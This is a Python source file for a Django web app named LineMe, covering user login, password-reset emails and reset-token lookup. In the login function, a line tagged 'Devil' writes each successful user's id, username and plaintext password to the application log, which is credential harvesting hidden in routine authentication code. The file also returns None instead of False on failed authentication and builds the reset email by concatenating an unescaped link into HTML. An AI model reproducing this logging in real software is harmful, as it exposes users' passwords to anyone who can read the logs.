#!/usr/bin/env python
# coding: utf-8
# created by hevlhayt@foxmail.com 
# Date: 2016/10/26
# Time: 19:04
from django.contrib.auth import authenticate
from django.contrib.auth import login
from django.core.mail import send_mail

from LineMe.settings import logger
from LineMe.utils import logger_join
from LineMe.validations import validate_passwd
from LineMe.validations import validate_username
from iauth.methods.session import create_session_id
from iauth.models import ResetToken


def login_user(request, username, password):

    username = username.lower()

    if validate_username(username) and validate_passwd(password, password):
        user = authenticate(username=username, password=password)
        if user is not None:
            if user.is_active:
                login(request, user)
                create_session_id(request)
                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), username, password]) + ']'))
                return True
    else:
        return False


def send_reset_passwd_email(email, href):
    send_mail(
        'Reset your password in LineMe: '+email,
        'LineMe',
        'cnclineme@126.com',
        [email],
        html_message='<h3>Hi~</h3>'
                     '<p>You are resetting your password in LineMe via this email</p>'
                     '<p>Click the following link to process</p>'
                     '<p>The link will expired in 30 mins</p>'
                     '<a href="'+href+'">CLICK ME</a>('+href+')'
                     '<p>Any problem you can contact hevlhayt@foxmail.com</p>',
        fail_silently=False,
    )


def rt_existed(token, now):
    return ResetToken.objects.filter(token=token, expired__gt=now, completed=False).exists()
